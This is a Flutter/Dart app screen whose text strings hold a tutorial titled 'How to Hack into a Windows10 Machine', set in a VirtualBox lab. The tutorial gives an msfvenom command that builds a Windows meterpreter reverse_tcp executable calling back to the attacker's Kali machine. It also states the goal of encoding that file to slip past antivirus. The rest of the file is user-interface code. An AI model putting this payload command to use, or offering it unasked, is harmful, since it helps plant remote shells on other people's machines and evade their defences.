import 'package:flutter/material.dart';
import 'package:hackerstudiopro/tricks/tricks_main.dart';

class TricksSeven extends StatefulWidget {
  @override
  _TricksSevenState createState() => _TricksSevenState();
}

class _TricksSevenState extends State<TricksSeven> {
  var text = '''
  Introduction

The Metasploit Framework is the most commonly-used framework for hackers worldwide. It allows hackers to set up listeners that create a conducive environment (referred to as a Meterpreter) to manipulate compromised machines. In this article, we’ll look at how this framework within Kali Linux can be used to attack a Windows 10 machine. We shall do this through a malicious executable file using Shellter.

This article assumes the installation of Kali Linux has been done and is reachable through a bridged connection from a Windows machine on VirtualBox.
  ''';
  var text1 = '''
  Creating a Malicious .exe File

To create the executable, you would use msfvenom as shown in the command below:

msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=192.168.100.4 LPORT=4444 -o /root/something32.exe

The command above instructs msfvenom to generate a 32-bit Windows executable file that implements a reverse TCP connection for the payload. The format must be specified as being type .exe, and the local host (LHOST) and local port (LPORT) have to be defined. In our case, the LHOST is the IP address of our attacking Kali Linux machine, and the LPORT is the port to listen on for a connection from the target once it has been compromised.

To obtain our IP address we use the ifconfig command within Kali, specifying the interface as eth0 (since we are on Ethernet) as shown below.
  ''';
  var text2 = '''
  

The screenshot below shows the output of the command on successful .exe generation.
  ''';
  var text3 = '''
  Antivirus solutions work by detecting malicious signatures within executables. Our file will thus be flagged as malicious once within the Windows environment. We therefore have to figure out a way to modify it to bypass antivirus detection. We will encode it to make it fully undetectable, or FUD.

  Please go through the next two tutorial.
  ''';
  @override
  Widget build(BuildContext context) {
    var size = MediaQuery.of(context).size;
    return Scaffold(
      body: Stack(
        children: <Widget>[
          Container(
            // Here the height of the container is 45% of our total height
            height: size.height * .45,
            decoration: BoxDecoration(
              color: Color(0xFFF5CEB8),
              image: DecorationImage(
                alignment: Alignment.centerLeft,
                image: AssetImage("assets/images/undraw_pilates_gpdb.png"),
              ),
            ),
          ),
          SafeArea(
            child: Column(
              children: <Widget>[
                Align(
                  alignment: Alignment.topLeft,
                  child: GestureDetector(
                    onTap: () => Navigator.pushReplacement(context,
                        MaterialPageRoute(builder: (context) => TricksMain())),
                    child: Container(
                      alignment: Alignment.center,
                      height: 52,
                      width: 52,
                      decoration: BoxDecoration(
                        color: Color(0xFFF2BEA1),
                        // color:Colors.orange,
                        shape: BoxShape.circle,
                      ),
                      child: Icon(Icons.arrow_back_ios, color: Colors.white),
                    ),
                  ),
                ),
                Text("How to Hack into a Windows10 Machine",
                    style: TextStyle(
                        fontSize: 30,
                        color: Colors.grey,
                        fontWeight: FontWeight.bold)),
                Expanded(
                  child: Padding(
                    padding: const EdgeInsets.all(8.0),
                    child: ListView(
                      children: <Widget>[
                        Text(
                          text,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Text(
                          text1,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Container(child: Image.asset('assets/images/shellter19.png')),
                       Text(
                          text2,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Container(child: Image.asset('assets/images/shellter20.png')),
                       Text(
                          text3,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),    
                        RaisedButton(
                          child: Text(
                              "Follow me on Social Media if you have Questions"),
                          onPressed: () {
                            followMe();
                          },
                          color: Color(0xFFF2BEA1),
                        )
                      ],
                    ),
                  ),
                )
              ],
            ),
          )
        ],
      ),
    );
  }

  void followMe() {
    showDialog(
        context: context,
        builder: (context) {
          return AlertDialog(
            backgroundColor: Color(0xFFF5CEB8),
            title: Text('Follow me'),
            content: Text("Twitter: @Millime64755564"),
            actions: <Widget>[
              FlatButton(
                  onPressed: () => Navigator.pop(context), child: Text('Exit'))
            ],
          );
        });
  }
}
